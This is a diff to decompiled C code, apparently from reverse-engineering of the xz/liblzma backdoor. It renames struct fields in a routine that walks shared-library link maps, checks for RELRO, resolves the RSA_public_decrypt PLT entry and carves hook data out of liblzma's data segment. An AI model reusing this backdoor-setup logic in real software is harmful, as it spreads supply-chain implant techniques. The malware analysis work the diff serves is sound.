@@ -139,7 +139,7 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
         if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)rtld_global_ptr)) {
           return FALSE;
         }
-        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_info->dyn) {
+        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_info->dynamic_segment) {
           return FALSE;
         }
         shared_maps->dynamic_linker_map = r_map;
@@ -163,10 +163,10 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
   if (success == FALSE) {
     return FALSE;
   }
-  if (elf_info->gnurelro_found == FALSE) {
+  if (elf_info->gnurelro_present == FALSE) {
     return FALSE;
   }
-  if ((elf_info->flags & 0x20) == 0) {
+  if ((elf_info->feature_flags & 0x20) == 0) {
     return FALSE;
   }
   plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_RSA_public_decrypt);
@@ -194,7 +194,7 @@ LAB_00104924:
     map_cursor = data->data->liblzma_map;
     if ((map_cursor != (link_map *)0x0) &&
        (((success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info), success != FALSE &&
-         ((elf_info->flags & 0x20) != 0)) &&
+         ((elf_info->feature_flags & 0x20) != 0)) &&
         (hooks_blob = elf_get_data_segment(elf_info,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
       *hooks_data_addr_ptr = (backdoor_hooks_data_t *)((long)hooks_blob + 0x10);
       *(u64 *)((long)hooks_blob + 0x590) = liblzma_data_segment_size - 0x598;
